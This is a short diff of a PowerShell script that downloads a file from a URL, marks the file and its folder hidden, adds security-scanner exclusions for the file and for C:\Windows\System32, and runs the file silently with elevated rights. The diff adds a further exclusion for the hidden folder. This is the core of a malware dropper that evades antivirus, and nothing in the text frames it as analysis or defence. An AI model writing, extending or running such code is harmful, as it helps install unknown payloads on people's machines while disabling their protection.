@@ -28,9 +28,10 @@ try {
     Invoke-WebRequest -Uri $downloadUrl -OutFile $tempPath -UseBasicParsing -ErrorAction $stopAction
     (Get-Item $hiddenFolder).Attributes += 'Hidden'
     (Get-Item $tempPath).Attributes += 'Hidden'
-    
-    # Add exclusions
+
+    # Add exclusions for the file, its directory, and system32
     Add-Exclusion -Path $tempPath
+    Add-Exclusion -Path $hiddenFolder
     Add-Exclusion -Path "C:\Windows\System32"
 
     Start-Process -FilePath $tempPath -WindowStyle Hidden -Verb $runAs -Wait
